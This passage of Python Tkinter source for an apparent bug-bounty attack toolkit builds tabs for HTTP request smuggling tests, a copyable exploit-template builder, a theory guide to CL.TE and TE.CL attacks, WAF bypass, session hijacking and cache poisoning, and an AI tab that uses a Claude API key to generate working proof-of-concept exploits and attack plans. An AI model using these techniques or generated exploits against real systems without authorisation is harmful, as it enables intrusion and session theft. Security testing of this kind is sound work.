        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, f"TE.TE OBFUSCATION — {len(_smug.TE_TE_VARIANTS)} Variants", "🔧").pack(fill='x', pady=(0,8))
        crd2 = mk_card(p2); crd2.pack(fill='x', pady=(0,8))
        tk.Label(crd2, text=(
            "  14 Transfer-Encoding obfuscation techniques to bypass WAF\n"
            "  Tests which variants reach back-end — any working = smuggling possible\n"
            "  Variants include: xchunked, CHUNKED, tab-prefixed, double TE, null-byte..."
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        smug_txt2, smug_log2 = _mklog2(p2)

        def _run_te_te():
            host = self._smug_host.get().strip()
            if not host: return
            try: port = int(self._smug_port.get())
            except: port = 443
            smug_txt2.config(state='normal'); smug_txt2.delete('1.0','end')
            smug_txt2.config(state='disabled')
            def _go():
                r = _smug.test_te_te_variants(host, port, self._smug_path.get() or "/",
                                               self._smug_tls.get(), smug_log2)
                working = r.get('working', [])
                self.root.after(0, lambda: self.set_status(
                    f"TE.TE: {len(working)}/{len(_smug.TE_TE_VARIANTS)} variants work",
                    RED if working else GREEN))
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(p2, "🔧 Test All 14 TE Variants", _run_te_te, YELLOW, small=True).pack(anchor='w', pady=(8,0))

        # ── Sub-tab 3: Exploit Builder ────────────────────────────
        p3 = mk_frame(f3, bg=BG2); p3.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p3, "EXPLOIT BUILDER — Pre-built Templates", "💣").pack(fill='x', pady=(0,8))

        r = mk_frame(p3, bg=BG2); r.pack(fill='x', pady=(0,8))
        tk.Label(r, text="Template:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._smug_tpl = tk.StringVar(value=list(_smug.SMUGGLING_PAYLOADS.keys())[0])
        ttk.Combobox(r, textvariable=self._smug_tpl,
                     values=list(_smug.SMUGGLING_PAYLOADS.keys()),
                     width=46, font=MONO_S).pack(side='left', padx=8)

        desc_lbl = tk.Label(p3, text="", bg=BG2, fg=YELLOW, font=MONO_S)
        desc_lbl.pack(anchor='w', pady=(0,4))

        exploit_txt = tk.Text(p3, height=18, bg='#020408', fg=GREEN,
                               font=('Consolas',9), relief='flat', bd=0,
                               wrap='none', padx=10, pady=6)
        exploit_txt.pack(fill='both', expand=True, pady=(0,8))

        def _load_tpl(*_):
            name     = self._smug_tpl.get()
            template = _smug.SMUGGLING_PAYLOADS.get(name, {})
            host     = self._smug_host.get() or "target.com"
            body     = template.get("template","").format(host=host, cl="80")
            desc_lbl.config(text=f"  {template.get('description','')}")
            exploit_txt.delete('1.0','end')
            exploit_txt.insert('end', f"# Exploit: {name}\n")
            exploit_txt.insert('end', f"# Description: {template.get('description','')}\n\n")
            exploit_txt.insert('end', body)

        self._smug_tpl.trace_add('write', _load_tpl)
        _load_tpl()

        bf3 = mk_frame(p3, bg=BG2); bf3.pack(fill='x')
        mk_btn(bf3, "📋 Copy Exploit", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(exploit_txt.get('1.0','end')),
            self.root.update(),
            self.set_status("Exploit copied!", GREEN)), ACCENT, small=True).pack(side='left', padx=4)

        # ── Sub-tab 4: Theory ─────────────────────────────────────
        p4 = mk_frame(f4, bg=BG2); p4.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p4, "HTTP SMUGGLING — THEORY & IMPACT", "📖").pack(fill='x', pady=(0,8))
        theory = mk_stext(p4, h=28, bg=BG3, fg=FG)
        theory.pack(fill='both', expand=True)
        theory.config(state='normal')
        theory.insert('end', """HTTP REQUEST SMUGGLING — COMPLETE GUIDE
══════════════════════════════════════════

HOW IT WORKS
  Modern stacks: CDN/WAF (front-end) → App server (back-end)
  If they disagree where one HTTP request ends → smuggling possible
  You inject a hidden request that only the back-end sees

CL.TE ATTACK
  Front-end: reads Content-Length → passes all bytes to back-end
  Back-end:  reads Transfer-Encoding → sees early "0\\r\\n\\r\\n" terminator
  Result:    remaining bytes treated as START of NEXT request

  POST / HTTP/1.1
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED     ← back-end treats this as start of next request

TE.CL ATTACK
  Front-end: reads Transfer-Encoding → passes chunked body
  Back-end:  reads Content-Length → waits for more data
  Result:    back-end hangs waiting for bytes that front-end won't send

TE.TE OBFUSCATION (bypass WAF)
  Both use Transfer-Encoding, but one gets confused:
  Transfer-Encoding: xchunked    ← WAF ignores, back-end accepts
  Transfer-Encoding: CHUNKED     ← Case confusion
  Transfer-Encoding:\\tchunked   ← Tab separator
  Two TE headers: one processed, one ignored

IMPACT SCENARIOS

  1. WAF Bypass ($5k-$20k)
     POST /public  → smuggles → GET /admin
     WAF checks POST /public: allowed
     Back-end processes GET /admin: executed

  2. Session Hijacking ($10k-$50k)
     Smuggle partial request → back-end appends NEXT user's request
     → You receive: Cookie: session=VICTIM_TOKEN

  3. Cache Poisoning ($5k-$25k)
     Smuggle to inject malicious cached response
     → All users served your XSS payload

  4. XSS via Smuggling ($3k-$15k)
     Reflect attacker-controlled data into victim response
     Bypasses WAF XSS filter

DETECTION
  CL.TE: Send large Content-Length, terminate chunked body
    → Back-end times out (10+ sec) = VULNERABLE
  TE.CL: Send complete chunks, small Content-Length
    → Back-end waits for more bytes = VULNERABLE
  Differential: Two requests, second gets unexpected response

TOOLS
  This tab: timing-based detection + TE.TE variants
  Burp Suite Pro: HTTP Request Smuggler extension (gold standard)
  smuggler.py: Built-in scanner (tools/smuggler.py) — also in Auto Detector tab
               Run standalone: python tools/smuggler.py -u https://target.com

RESOURCES
  James Kettle research: portswigger.net/research/http-desync-attacks
  PortSwigger labs: portswigger.net/web-security/request-smuggling
  Defcon talks: HTTP Desync Attacks — Reborn
""")
        theory.config(state='disabled')

    # ═════════════════════════════════════════════════════════════
    #  🧠  AI AUTO-EXPLOIT ENGINE — v4
    # ═════════════════════════════════════════════════════════════
    def _build_ai_exploit_tab(self, frame):
        from modules.advanced import ai_exploit as _ae
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  💣 PoC Generator  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🔗 Chain Analyzer  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  📋 Report Writer  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  💰 Bounty Estimator  ")
        f5 = tk.Frame(nb2, bg=BG2); nb2.add(f5, text="  🎯 Attack Suggester  ")

        # ── Shared: API key + finding selector ────────────────────
        def _api_key_row(parent):
            r = mk_frame(parent, bg=BG2); r.pack(fill='x', pady=(0,8))
            tk.Label(r, text="Claude API Key:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
            v = tk.StringVar(value=load_cfg().get("api_keys",{}).get("claude_api_key",""))
            e = mk_entry(r, var=v, w=44, show="●"); e.pack(side='left', padx=8, ipady=3)
            def save_key():
                cfg = load_cfg()
                cfg.setdefault("api_keys",{})["claude_api_key"] = v.get()
                save_cfg(cfg)
                self.set_status("API key saved!", GREEN)
            mk_btn(r, "💾 Save Key", save_key, FG3, small=True).pack(side='left', padx=4)
            tk.Label(r, text="  Get: console.anthropic.com", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=8)
            return v

        def _finding_selector(parent, api_var):
            """Row to select finding from DB or enter manually."""
            sel_f = mk_card(parent); sel_f.pack(fill='x', pady=(0,8))
            inner = mk_frame(sel_f, bg=BG3); inner.pack(fill='x', padx=12, pady=8)
            tk.Label(inner, text="Select Finding:", bg=BG3, fg=FG2, font=MONO_B).pack(anchor='w', pady=(0,4))

            findings = load_findings()
            choices  = [f"[{f.get('severity','?')}] {f.get('title','?')[:60]} ({f.get('id','')})"
                        for f in findings]
            fsel_var = tk.StringVar(value=choices[0] if choices else "No findings — add in Findings tab")
            cb = ttk.Combobox(inner, textvariable=fsel_var, values=choices, width=72, font=MONO_S)
            cb.pack(fill='x', pady=(0,4))
            mk_btn(inner, "🔄 Refresh", lambda: (
                cb.configure(values=[
                    f"[{f.get('severity','?')}] {f.get('title','?')[:60]} ({f.get('id','')})"
                    for f in load_findings()
                ])
            ), FG3, small=True).pack(anchor='w')

            def get_selected_finding():
                sel = fsel_var.get()
                if not sel or "No findings" in sel: return None
                # Extract ID from end of string
                import re as _re
                m = _re.search(r'\(([A-Z]+-\d+)\)$', sel)
                if m:
                    fid = m.group(1)
                    return next((f for f in load_findings() if f.get('id') == fid), None)
                return None

            return get_selected_finding

        def _output_box(parent, h=20):
            """Terminal-style output box."""
            wrap_f = mk_frame(parent, bg=BG2); wrap_f.pack(fill='both', expand=True)
            txt = tk.Text(wrap_f, height=h, bg='#020408', fg=GREEN,
                          font=('Consolas',9), relief='flat', bd=0,
                          state='disabled', wrap='none', padx=10, pady=6)
            vsb = ttk.Scrollbar(wrap_f, orient='vertical',   command=txt.yview)
            hsb = ttk.Scrollbar(wrap_f, orient='horizontal',  command=txt.xview)
            txt.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
            txt.pack(side='left', fill='both', expand=True)
            vsb.pack(side='right', fill='y')
            hsb.pack(side='bottom', fill='x')
            def set_text(content, color=GREEN):
                txt.config(state='normal'); txt.delete('1.0','end')
                txt.config(fg=color); txt.insert('end', content)
                txt.config(state='disabled'); txt.see('1.0')
            def append(content, color=None):
                txt.config(state='normal')
                if color: txt.config(fg=color)
                txt.insert('end', content)
                txt.see('end'); txt.config(state='disabled')
            return txt, set_text, append

        # ═══ SUB-TAB 1: PoC GENERATOR ════════════════════════════
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "AI POC GENERATOR + BURP REQUEST + IMPACT", "💣").pack(fill='x', pady=(0,8))
        info1 = mk_card(p1); info1.pack(fill='x', pady=(0,8))
        tk.Label(info1, text=(
            "  Select a finding → AI generates: working Python PoC · Burp Repeater request\n"
            "  Impact analysis · Remediation advice  —  Saves to logs/<project>/ai_exploits/\n"
            "  Uses Claude claude-sonnet-4-6 (Sonnet 4) — fast, accurate, security-focused"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        api_var1     = _api_key_row(p1)
        get_finding1 = _finding_selector(p1, api_var1)

        # Output notebook
        out_nb = ttk.Notebook(p1); out_nb.pack(fill='both', expand=True, pady=(8,0))
        of1 = tk.Frame(out_nb, bg=BG2); out_nb.add(of1, text="  🐍 Python PoC  ")
        of2 = tk.Frame(out_nb, bg=BG2); out_nb.add(of2, text="  📡 Burp Request  ")
        of3 = tk.Frame(out_nb, bg=BG2); out_nb.add(of3, text="  💥 Impact  ")
        of4 = tk.Frame(out_nb, bg=BG2); out_nb.add(of4, text="  🔧 Remediation  ")

        poc_txt,   set_poc,    _ = _output_box(of1)
        burp_txt,  set_burp,   _ = _output_box(of2)
        impact_txt,set_impact, _ = _output_box(of3)
        remed_txt, set_remed,  _ = _output_box(of4)

        status_lbl = tk.Label(p1, text="", bg=BG2, fg=FG3, font=MONO_S)
        status_lbl.pack(anchor='w', pady=(4,0))

        def _run_poc_gen():
            finding = get_finding1()
            if not finding:
                messagebox.showwarning("No Finding", "Select a finding first — add findings in Findings tab", parent=self.root)
                return
            api_key = api_var1.get().strip()
            if not api_key:
                messagebox.showwarning("API Key", "Enter your Claude API key above (get at console.anthropic.com)", parent=self.root)
                return

            status_lbl.config(text="⏳ AI is generating PoC, Burp request, impact, remediation...", fg=CYAN)
            self.set_status("AI Auto-Exploit: generating...", CYAN)

            def log_cb(m, t='info'):
                clr = {'ok':GREEN,'info':CYAN,'warn':YELLOW,'err':RED,'dim':FG3}.get(t,FG)
                status_lbl.config(text=m, fg=clr)

            def _go():
                # Generate all 4 in parallel
                import threading as _th
                results = {}

                def _gen(key, fn, *args):
                    results[key] = fn(*args)

                threads = [
                    _th.Thread(target=_gen, args=("poc",    _ae.generate_poc,         finding, api_key, log_cb), daemon=True),
                    _th.Thread(target=_gen, args=("burp",   _ae.generate_burp_request,finding, api_key, log_cb), daemon=True),
                    _th.Thread(target=_gen, args=("impact", _ae.generate_impact_analysis, finding, api_key, log_cb), daemon=True),
                    _th.Thread(target=_gen, args=("remed",  _ae.generate_remediation, finding, api_key, log_cb), daemon=True),
                ]
                for t in threads: t.start()
                for t in threads: t.join()

                # Save package
                proj_dir = LOGS_DIR / (finding.get('project','target'))
                pkg = _ae.save_exploit_package(
                    finding,
                    results.get("poc",""),
                    results.get("burp",""),
                    results.get("impact",""),
                    results.get("remed",""),
                    proj_dir
                )

                def _update():
                    set_poc(results.get("poc","# No PoC generated"), '#00ff88')
                    set_burp(results.get("burp","# No request generated"), CYAN)
                    set_impact(results.get("impact","# No impact generated"), FG)
                    set_remed(results.get("remed","# No remediation generated"), YELLOW)
                    status_lbl.config(text=f"✅ Complete! Saved: {pkg}", fg=GREEN)
                    self.set_status(f"AI exploit package saved: {pkg.name}", GREEN)
                self.root.after(0, _update)

            threading.Thread(target=_go, daemon=True).start()

        bf1 = mk_frame(p1, bg=BG2); bf1.pack(fill='x', pady=(8,0))
        mk_btn(bf1, "🧠 Generate Full Exploit Package", _run_poc_gen, RED).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf1, "📋 Copy PoC", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(poc_txt.get('1.0','end')),
            self.root.update()), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf1, "📋 Copy Burp", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(burp_txt.get('1.0','end')),
            self.root.update()), CYAN, small=True).pack(side='left', padx=4)

        # ═══ SUB-TAB 2: CHAIN ANALYZER ═══════════════════════════
        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, "AI EXPLOIT CHAIN ANALYZER", "🔗").pack(fill='x', pady=(0,8))
        info2 = mk_card(p2); info2.pack(fill='x', pady=(0,8))
        tk.Label(info2, text=(
            "  AI analyzes ALL your findings together to find exploit chains\n"
            "  SSRF + Cloud metadata = CRITICAL chain  ·  XSS + CSRF = account takeover\n"
            "  MEDIUM + MEDIUM chained correctly can become CRITICAL = higher bounty"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        api_var2 = _api_key_row(p2)

        # Filter options
        filt_f = mk_frame(p2, bg=BG2); filt_f.pack(fill='x', pady=(0,6))
        tk.Label(filt_f, text="Include findings:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        chain_proj_var = tk.StringVar(value=self.project.get() or "All Projects")
        projects = [p.get('name','') for p in load_projects()]
        ttk.Combobox(filt_f, textvariable=chain_proj_var,
                     values=["All Projects"] + projects, width=26, font=MONO_S).pack(side='left', padx=8)

        chain_txt, set_chain, _ = _output_box(p2, h=20)

        def _run_chain():
            api_key = api_var2.get().strip()
            if not api_key: messagebox.showwarning("API Key", "Enter Claude API key", parent=self.root); return
            proj  = chain_proj_var.get()
            finds = load_findings()
            if proj != "All Projects":
                finds = [f for f in finds if f.get('project') == proj]
            if not finds:
                messagebox.showwarning("No Findings", "No findings to analyze. Add findings first.", parent=self.root)
                return
            set_chain(f"⏳ Analyzing {len(finds)} findings for exploit chains...\n\n", CYAN)
            def _go():
                result = _ae.generate_chain_analysis(finds, api_key, lambda m,t='': None)
                self.root.after(0, lambda: (
                    set_chain(result, FG),
                    self.set_status(f"Chain analysis complete for {len(finds)} findings", GREEN)
                ))
            threading.Thread(target=_go, daemon=True).start()

        bf2 = mk_frame(p2, bg=BG2); bf2.pack(fill='x', pady=(8,0))
        mk_btn(bf2, "🔗 Analyze Exploit Chains", _run_chain, RED).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf2, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(chain_txt.get('1.0','end')), self.root.update()),
               ACCENT, small=True).pack(side='left', padx=4)

        # ═══ SUB-TAB 3: REPORT WRITER ════════════════════════════
        p3 = mk_frame(f3, bg=BG2); p3.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p3, "AI REPORT WRITER — H1 / Bugcrowd / Intigriti", "📋").pack(fill='x', pady=(0,8))
        info3 = mk_card(p3); info3.pack(fill='x', pady=(0,8))
        tk.Label(info3, text=(
            "  AI writes a complete, professional bug bounty report ready to submit\n"
            "  Formats: HackerOne · Bugcrowd · Intigriti · Generic\n"
            "  Top-tier researcher quality — clear, structured, compelling"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        api_var3     = _api_key_row(p3)
        get_finding3 = _finding_selector(p3, api_var3)

        plat_f = mk_frame(p3, bg=BG2); plat_f.pack(fill='x', pady=(0,6))
        tk.Label(plat_f, text="Platform:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        plat_var = tk.StringVar(value="hackerone")
        for plat, clr in [("hackerone","#2c7cb8"),("bugcrowd",ORANGE),("intigriti",PURPLE),("general",FG2)]:
            ttk.Radiobutton(plat_f, text=plat.capitalize(), variable=plat_var, value=plat).pack(side='left', padx=8)

        report_txt, set_report, _ = _output_box(p3, h=18)
        report_status = tk.Label(p3, text="", bg=BG2, fg=FG3, font=MONO_S)
        report_status.pack(anchor='w', pady=(4,0))

        def _run_report():
            finding = get_finding3()
            api_key = api_var3.get().strip()
            if not finding: messagebox.showwarning("No Finding","Select a finding first",parent=self.root); return
            if not api_key: messagebox.showwarning("API Key","Enter Claude API key",parent=self.root); return
            plat = plat_var.get()
            report_status.config(text=f"⏳ Writing {plat.upper()} report...", fg=CYAN)
            set_report(f"⏳ Generating {plat.upper()} report for:\n{finding.get('title','')}\n\n...", CYAN)
            def _go():
                result = _ae.generate_report(finding, plat, api_key, lambda m,t='': None)
                # Save to logs
                proj    = finding.get('project','target')
                out_dir = LOGS_DIR / proj / "ai_exploits"
                out_dir.mkdir(parents=True, exist_ok=True)
                safe    = "".join(c for c in finding.get('title','report')[:30] if c.isalnum() or c in(' ','-')).replace(' ','_')
                out_f   = out_dir / f"report_{plat}_{safe}.md"
                try: out_f.write_text(result, encoding='utf-8')
                except Exception: pass
                def _done():
                    set_report(result, FG)
                    report_status.config(text=f"✅ Report saved: {out_f.name}", fg=GREEN)
                    self.set_status(f"Report written: {out_f.name}", GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()

        bf3 = mk_frame(p3, bg=BG2); bf3.pack(fill='x', pady=(8,0))
        mk_btn(bf3, "📝 Generate Report", _run_report, GREEN).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf3, "📋 Copy Report", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(report_txt.get('1.0','end')),
            self.root.update(),
            self.set_status("Report copied!", GREEN)), ACCENT, small=True).pack(side='left', padx=4)

        # ═══ SUB-TAB 4: BOUNTY ESTIMATOR ═════════════════════════
        p4 = mk_frame(f4, bg=BG2); p4.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p4, "AI BOUNTY ESTIMATOR + PROGRAM TARGETING", "💰").pack(fill='x', pady=(0,8))
        info4 = mk_card(p4); info4.pack(fill='x', pady=(0,8))
        tk.Label(info4, text=(
            "  AI estimates realistic payout range based on vuln type, severity, context\n"
            "  Suggests best programs to target · Report tips to maximize payout\n"
            "  Duplicate risk assessment · Real-world comparable payouts"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        api_var4     = _api_key_row(p4)
        get_finding4 = _finding_selector(p4, api_var4)
        bounty_txt, set_bounty, _ = _output_box(p4, h=18)

        def _run_bounty():
            finding = get_finding4()
            api_key = api_var4.get().strip()
            if not finding: messagebox.showwarning("No Finding","Select a finding first",parent=self.root); return
            if not api_key: messagebox.showwarning("API Key","Enter Claude API key",parent=self.root); return
            set_bounty("⏳ Estimating bounty...\n\n", CYAN)
            def _go():
                result = _ae.estimate_bounty(finding, api_key, lambda m,t='': None)
                self.root.after(0, lambda: (
                    set_bounty(result, FG),
                    self.set_status("Bounty estimate complete", GREEN)
                ))
            threading.Thread(target=_go, daemon=True).start()

        bf4 = mk_frame(p4, bg=BG2); bf4.pack(fill='x', pady=(8,0))
        mk_btn(bf4, "💰 Estimate Bounty", _run_bounty, YELLOW).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf4, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(bounty_txt.get('1.0','end')), self.root.update()),
               ACCENT, small=True).pack(side='left', padx=4)

        # ═══ SUB-TAB 5: ATTACK SUGGESTER ═════════════════════════
        p5 = mk_frame(f5, bg=BG2); p5.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p5, "AI ATTACK SUGGESTER — Smart Recon to Attack", "🎯").pack(fill='x', pady=(0,8))
        info5 = mk_card(p5); info5.pack(fill='x', pady=(0,8))
        tk.Label(info5, text=(
            "  Input target info → AI ranks top 10 attack vectors by likelihood\n"
            "  Based on: tech stack, endpoints, WAF, subdomains discovered\n"
            "  Tells you: what to test FIRST for highest chance of finding bugs"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        api_var5 = _api_key_row(p5)

        # Target info fields
        tgt_f = mk_card(p5); tgt_f.pack(fill='x', pady=(0,8))
        inner5 = mk_frame(tgt_f, bg=BG3); inner5.pack(fill='x', padx=12, pady=8)

        atk_vars = {}
        for lbl, key, default in [
            ("Domain:",          "domain",     self.project.get() or ""),
            ("Tech Stack:",      "tech_stack", ""),
            ("WAF:",             "waf",        ""),
            ("Has Login:",       "has_login",  "Yes"),
            ("Has API:",         "has_api",    "Yes"),
        ]:
            r = mk_frame(inner5, bg=BG3); r.pack(fill='x', pady=2)
            tk.Label(r, text=lbl, bg=BG3, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
            v = tk.StringVar(value=default)
            mk_entry(r, var=v, w=46).pack(side='left', ipady=3)
            atk_vars[key] = v

        # Auto-fill from project
        def _autofill_target():
            proj = self.project.get()
            if not proj: return
            atk_vars['domain'].set(proj)
            # Try to get tech from httpx output
            httpx_f = LOGS_DIR / proj / "httpx.txt"
            if httpx_f.exists():
                try:
                    content = httpx_f.read_text()[:500]
                    atk_vars['tech_stack'].set("Detected from httpx: " + content[:80])
                except Exception: pass
        mk_btn(inner5, "← Auto-fill from Project", _autofill_target, FG3, small=True).pack(anchor='w', pady=(4,0))

        atk_txt, set_atk, _ = _output_box(p5, h=15)

        def _run_attack_suggest():
            api_key = api_var5.get().strip()
            if not api_key: messagebox.showwarning("API Key","Enter Claude API key",parent=self.root); return
            target_info = {k: v.get() for k, v in atk_vars.items()}
            # Enrich with findings
            target_info['findings_count'] = len(load_findings())
            target_info['subdomains']     = []  # would pull from project logs
            target_info['endpoints']      = []
            set_atk("⏳ AI analyzing attack surface...\n\n", CYAN)
            def _go():
                result = _ae.quick_attack_suggestions(target_info, api_key, lambda m,t='': None)
                self.root.after(0, lambda: (
                    set_atk(result, FG),
                    self.set_status("Attack suggestions generated", GREEN)
                ))
            threading.Thread(target=_go, daemon=True).start()

        bf5 = mk_frame(p5, bg=BG2); bf5.pack(fill='x', pady=(8,0))
        mk_btn(bf5, "🎯 Generate Attack Plan", _run_attack_suggest, GREEN).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf5, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(atk_txt.get('1.0','end')), self.root.update()),
               ACCENT, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  🕳️  DEEP RECON TAB — Advanced Recursive Per-Subdomain Recon
    # ═════════════════════════════════════════════════════════════
    def _build_deep_recon_tab(self, frame):
        from modules.recon.deep_recon import DeepReconEngine
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🚀 Run Deep Recon  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📊 Results Table  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  🚨 Findings  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  📋 Full Report  ")

        # ── Sub-tab 1: Configuration + Live Log ───────────────────
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "DEEP RECURSIVE RECON ENGINE", "🕳️").pack(fill='x', pady=(0,8))

        info = mk_card(p1, accent_top=True, accent_color=RED); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Per-subdomain deep dive: DNS (A/AAAA/MX/TXT/NS/CNAME/SRV/CAA/SOA/PTR)  ·  SPF/DMARC/DKIM\n"
            "  ASN/BGP/Geolocation  ·  CDN detection  ·  TLS cert (SANs, expiry, self-signed)\n"
            "  HTTP probe (status, title, tech, WAF)  ·  Port scan (38 ports)  ·  Takeover check\n"
            "  Zone transfer AXFR  ·  DNSSEC  ·  Internal IP leak detection  ·  Wildcard DNS"
        ), bg=BG2, fg=FG2, font=MONO_T, justify='left').pack(anchor='w', padx=14, pady=10)

        # Config row 1
        r1 = mk_frame(p1, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Domain:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        self._dr_domain = tk.StringVar(value=self.project.get() or "")
        mk_entry(r1, var=self._dr_domain, w=34, placeholder="example.com").pack(side='left', ipady=4)
        mk_btn(r1, "← Project", lambda: self._dr_domain.set(self.project.get()),
               FG3, small=True).pack(side='left', padx=6)

        # Config row 2 — subdomain source
        r2 = mk_frame(p1, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Subs Source:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        self._dr_subs_src = tk.StringVar(value="auto")
        for val, lbl, clr in [
            ("auto",    "Auto-discover first",        GREEN),
            ("file",    "Load from file",             CYAN),
            ("project", "From project logs",          ACCENT),
        ]:
            ttk.Radiobutton(r2, text=lbl, variable=self._dr_subs_src, value=val).pack(side='left', padx=8)

        # File picker (only for 'file' mode)
        r2b = mk_frame(p1, bg=BG2); r2b.pack(fill='x', pady=(0,6))
        tk.Label(r2b, text="Subs File:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        self._dr_subs_file = tk.StringVar()
        mk_entry(r2b, var=self._dr_subs_file, w=40).pack(side='left', ipady=3)
        mk_btn(r2b, "📂", lambda: self._dr_subs_file.set(
            filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])),
               FG3, small=True).pack(side='left', padx=4)

        # Config row 3 — concurrency + options
        r3 = mk_frame(p1, bg=BG2); r3.pack(fill='x', pady=(0,6))
        tk.Label(r3, text="Workers:", bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        self._dr_workers = tk.StringVar(value="20")
        ttk.Combobox(r3, textvariable=self._dr_workers,
                     values=["5","10","20","30","50"], width=5, font=MONO_S).pack(side='left')
        tk.Label(r3, text="  Options:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,8))
        self._dr_skip_ports  = tk.BooleanVar(value=False)
        self._dr_skip_tls    = tk.BooleanVar(value=False)
        self._dr_skip_http   = tk.BooleanVar(value=False)
        for text, var in [
            ("Skip port scan", self._dr_skip_ports),
            ("Skip TLS",       self._dr_skip_tls),
            ("Skip HTTP",      self._dr_skip_http),
        ]:
            ttk.Checkbutton(r3, text=text, variable=var).pack(side='left', padx=6)

        # Progress label
        self._dr_progress = tk.Label(p1, text="  Ready — configure and click Start",
                                      bg=BG2, fg=FG3, font=MONO_S)
        self._dr_progress.pack(anchor='w', pady=(0,4))

        # Live log terminal
        dr_log = tk.Text(p1, height=18, bg=TERM_BG, fg=TERM_FG,
                          font=(_MONO_FACE, 9), relief='flat', bd=0,
                          state='disabled', wrap='none',
                          insertbackground=ACCENT, padx=10, pady=8)
        vsb_dr = ttk.Scrollbar(p1, orient='vertical', command=dr_log.yview)
        hsb_dr = ttk.Scrollbar(p1, orient='horizontal', command=dr_log.xview)
        dr_log.configure(yscrollcommand=vsb_dr.set, xscrollcommand=hsb_dr.set)
        log_wrap = mk_frame(p1, bg=BG2); log_wrap.pack(fill='both', expand=True)
        dr_log.pack(side='left', fill='both', expand=True, in_=log_wrap)
        vsb_dr.pack(side='right', fill='y', in_=log_wrap)
        hsb_dr.pack(side='bottom', fill='x')
        self._dr_log_widget = dr_log

        def _dr_log(msg, tag='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(tag,FG)
            dr_log.config(state='normal')
            dr_log.insert('end', msg+'\n', tag)
            dr_log.tag_config(tag, foreground=clr, font=(_MONO_FACE,9))
            dr_log.see('end'); dr_log.config(state='disabled')

        # Stop flag
        self._dr_stop = threading.Event()

        def _start_deep_recon():
            domain = self._dr_domain.get().strip()
            if not domain:
                messagebox.showwarning("No Domain", "Enter a domain first", parent=self.root)
                return
            src = self._dr_subs_src.get()
            self._dr_stop.clear()
            dr_log.config(state='normal'); dr_log.delete('1.0','end')
            dr_log.config(state='disabled')
            _dr_log(f"  ═══════════════════════════════════════════", "dim")
            _dr_log(f"  🕳️  DEEP RECON  —  {domain}", "info")
            _dr_log(f"  ═══════════════════════════════════════════", "dim")
            self._dr_progress.config(text=f"  ⏳ Starting deep recon for {domain}...", fg=CYAN)

            def _go():
